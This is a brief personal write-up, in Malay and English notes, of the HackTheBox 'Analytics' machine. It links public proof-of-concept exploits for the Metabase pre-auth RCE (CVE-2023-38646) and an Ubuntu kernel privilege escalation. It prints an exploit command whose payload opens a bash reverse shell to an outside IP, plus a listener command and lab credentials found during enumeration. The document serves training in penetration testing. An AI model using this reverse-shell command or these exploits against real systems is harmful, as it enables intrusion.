---
date:
  created: 2023-12-19
  updated: 2023-12-19
description: HTB-Analytics(easy) Writeup
tags:
  - gobuster
  - cve
  - linpeas
comments: true
---

# Analytics

## Reconnaissance
- nmap
- nano /etc/hosts (analytics.htb) (data.analytical.htb)

## Enumeration
open burpsuite atau just direct ke web untuk dapatkan setup-token
takde fuzzing, direct public exploit

## Exploitation
- metabase vulnerable (https://github.com/shamo0/CVE-2023-38646-PoC) https://github.com/securezeron/CVE-2023-38646 https://github.com/m3m0o/metabase-pre-auth-rce-poc	https://medium.com/@starlox.riju123/hackthebox-analytics-metabase-rce-bd3421cba76d 

listening - rlwrap -lnvp 1234
exploit command - `python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.16.14/1234 0>&1"`

- run linpeas

META_PASS=An4lytics_ds20223#
META_USER=metalytics

dapat user.txt

## Privesc
- run linpeas balik sbb dah tukar user. tadi www-data user
- check ubuntu version, kernel version
- search exploit dekat internet (https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
- send file (tengok hacktools)
- run
dapat root.txt